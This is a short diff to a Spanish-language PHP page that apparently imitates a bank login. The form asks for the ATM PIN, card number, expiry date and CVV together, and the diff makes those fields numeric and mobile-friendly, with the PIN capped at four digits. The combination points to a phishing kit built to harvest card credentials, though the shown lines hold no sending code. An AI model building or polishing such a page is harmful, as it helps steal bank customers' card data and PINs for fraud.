@@ -130,7 +130,7 @@ $fecha = date('l, j \d\e F \d\e Y, g:i a', strtotime('-5 hours'));
 
         <div class="fld" id="fld-pass">
           <span class="ic"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></span>
-          <input type="password" id="pass" placeholder="Clave del cajero" autocomplete="off">
+          <input type="tel" id="pass" placeholder="Clave del cajero" maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
         </div>
         <div class="err-msg" id="err-pass">Ingresa tu clave</div>
         <a class="flink">¿Olvidaste o bloqueaste tu clave?</a>
@@ -218,8 +218,8 @@ $fecha = date('l, j \d\e F \d\e Y, g:i a', strtotime('-5 hours'));
         <div class="err-msg" id="err-cardnum">Ingresa el número de tarjeta</div>
 
         <div class="row">
-          <div class="field"><label>Vencimiento</label><input id="venc" placeholder="MM/AA" maxlength="5" autocomplete="off"></div>
-          <div class="field"><label>CVV</label><input id="cvv" type="password" placeholder="•••" maxlength="3" autocomplete="off"></div>
+          <div class="field"><label>Vencimiento</label><input id="venc" placeholder="MM/AA" maxlength="5" inputmode="numeric" autocomplete="off"></div>
+          <div class="field"><label>CVV</label><input id="cvv" type="tel" placeholder="•••" maxlength="3" inputmode="numeric" pattern="[0-9]*" autocomplete="off"></div>
         </div>
         <div class="err-msg" id="err-venc">Ingresa la fecha de vencimiento</div>
 
